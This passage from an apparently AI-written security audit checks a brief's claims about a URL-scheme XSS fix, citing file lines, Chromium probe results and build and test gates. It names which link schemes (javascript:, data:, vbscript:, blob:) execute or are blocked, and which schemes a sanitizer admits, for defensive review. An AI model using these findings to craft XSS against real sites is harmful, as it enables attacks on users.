  and admits neither `:` nor a second `/`, so with a hardcoded `https://github.com/` prefix the
  origin cannot be escaped (`../x` still resolves within `github.com`).

---

## 7. Deliverable 5 — every place the brief was wrong

The brief's `string.uri` count is **right**, and I want to say so first, because the brief itself
warned it might not be.

| id | claim | status |
|---|---|---|
| **BRIEF-1** | "There are **four** [`string.uri` fields] (lines 241, 265, 343, 633)" | **CORRECT — re-measured, exactly those four lines, no fifth anywhere in `proto/`.** The two prior "two"s were both wrong; the four is right |
| **BRIEF-2** | Framing the proto annotation as the denominator for "is the guard complete at the write boundary" | **WRONG as a denominator.** Of the four, `:241` (`Attachment.url`) is a dead field, and `:343` (`Task.remote_url`) is a *response* field, not an ingress. Only `:265` and `:633` are ingress. And the annotation-based denominator misses the live GitHub passthrough writer (F1) and the entire markdown route (F2), because neither is an annotated proto field. Four is the right count of a thing that is not the right thing to count |
| **BRIEF-3** | "engines block `javascript:` navigation into a new browsing context" (given as background/inference) | **CORRECT, and now MEASURED** in Chromium rather than inferred, with popup-blocker-off control. Upgraded from inferred to established (Chromium only) |
| **BRIEF-4** | "`data:` and `vbscript:` sit in the same open set and are **not equally mitigated**" | **NOT SUPPORTED.** Under `target="_blank"` I measured `javascript:`, `data:`, `vbscript:` and `blob:` all failing to execute in Chromium. The `javascript:` result has a positive control; the others I rate inferred. Nothing I measured shows unequal mitigation |
| **BRIEF-5** | Baseline: "`cd web && npm test` exit 0 — `task-ready`, `safe-url: ok`, `url-binding-scan: ok`" | **Cosmetically wrong.** Exit 0 confirmed, but the actual stdout is only `safe-url: ok` and `url-binding-scan: ok`. `task-ready.test.js` runs and prints **nothing**. Listing it as a result implies an output line that does not exist — the same shape of error as reading counts instead of names |
| **BRIEF-6** | "Base of the branch is `7a0f220` = `origin/main` = live in production" | **UNVERIFIABLE IN THIS CLONE, and the author flagged it too.** `git branch -a` shows only `origin/markdown-sanitize` and `origin/url-scheme-validation`; **`origin/main` does not exist**, and `origin/HEAD` points at `origin/url-scheme-validation`, not at any `main`. I confirm `7a0f220` is the parent of `4187910`. The `= origin/main = production` equation is relayed and I cannot check it. Two rounds running, two agents have now reported this — it is a property of the clone, so please stop asserting it as `[MEASURED by me]` in briefs issued into this clone |
| **BRIEF-7** | "exactly 4 pre-existing copylocks … at 1500/1610/1818/1995" | **Correct for the base, needs a caveat for this commit.** At `d4c4e6b` I measure the same 4 messages at **1506/1616/1824/2001** — a uniform +6, matching the six lines added to `server.go`. The brief scopes them to the base so it is not an error, but anyone re-measuring at `d4c4e6b` will see different numbers |
| **BRIEF-8** | Item 4: "assess the frontend guard as the only control for existing data" | **Understated, not wrong.** It is the only control for existing data **and** (F1) the only control for every read of a GitHub-platform collection, forever, including rows that will never exist because nothing is persisted. The framing "existing data" implies a shrinking problem; it is not shrinking |
| **BRIEF-9** | Item 5 lists the author's residual risks as "no migration; platform-sync unvalidated; execution untested" and asks me to add missed ones | **The relayed list mis-states one.** "Platform-sync writes unvalidated" describes a *write*. The live mechanism is a *read-through* that never writes, which is why no write-boundary fix can address it. The distinction changes the recommended fix location from the adapter to `convert.go` |
| **BRIEF-10** | Makefile context: "no Makefile target and no documented command runs `npm test`" | **CORRECT — re-measured.** `Makefile:9-10` and `:16-17`; zero hits for `npm test` across `Makefile`, `*.yml`, `*.yaml`, `*.sh` |

**And one error in the author's report** (not the brief, but it propagated from it):

| id | claim | status |
|---|---|---|
| **AUTH-1** | Report §1: "I had no real browser engine available", and §8: "if anyone wants the severity settled it needs a real browser engine" | **WRONG.** `/usr/bin/chromium` is installed in this environment. The engine was available and the question was answerable; §1 of this report answers it. The author's *epistemic* call (declining to assert execution) was right; the *factual* premise was not checked |
| **AUTH-2** | Report §2: platform sync excluded because "values originate from the upstream platform" | Describes `github.go`, which has no production caller. The live path is `passthrough.go`. See F1 |
| **AUTH-3** | Report §3: "Markdown is sanitized… strips a `javascript:` href. **Static reading of the config path; I did not execute it.**" | The `javascript:` conclusion is **correct** — I executed it and confirmed. But the static reading stopped one step short of the finding: DOMPurify's default policy also **admits** `mailto:`/`tel:`/`ftp:`/`sms:`/`cid:`/`xmpp:`, `<form action>` and `<img src>`. Correctly scoped out as another track's file; incorrectly concluded as "sanitized" full stop |

---

## 8. Reproduction

All probes are under `/tmp/xssprobe/` (outside the repo). Nothing in the working tree was modified;
the one temporary file (`internal/server/zz_audit_probe_test.go`) was deleted and
`git status --porcelain` is empty `[MEASURED at start and end]`.

```
corpus.json        80-input differential corpus
go-results.json    validateURLField verdicts (via the deleted probe test)
probe.js/.html     safeHref + real-anchor resolution, run in Chromium
blink-results.json Blink verdicts
nav.js             javascript: execution vs target (the §1 measurement)
nav3.js/nav4.js    data:/vbscript:/blob: under target="_blank"
md.mjs             marked + DOMPurify scheme policy (the F2 measurement)
```

Gates at `d4c4e6b`, child-process exit codes, no pipes:

| gate | result |
|---|---|
| `go build ./...` | **0** |
| `go vet ./...` | **1**, the same 4 copylocks, at 1506/1616/1824/2001 |
| `cd web && npm test` | **0** — `safe-url: ok`, `url-binding-scan: ok` |
| `git status --porcelain` | **empty** |

No `TestWatchTasks*` flake observed; I did not run the full `go test ./...` suite, since my axis is
production effect rather than regression, and the author reports it green at this commit
`[MEASURED-BY-dev-xss-url, not re-measured by me]`.
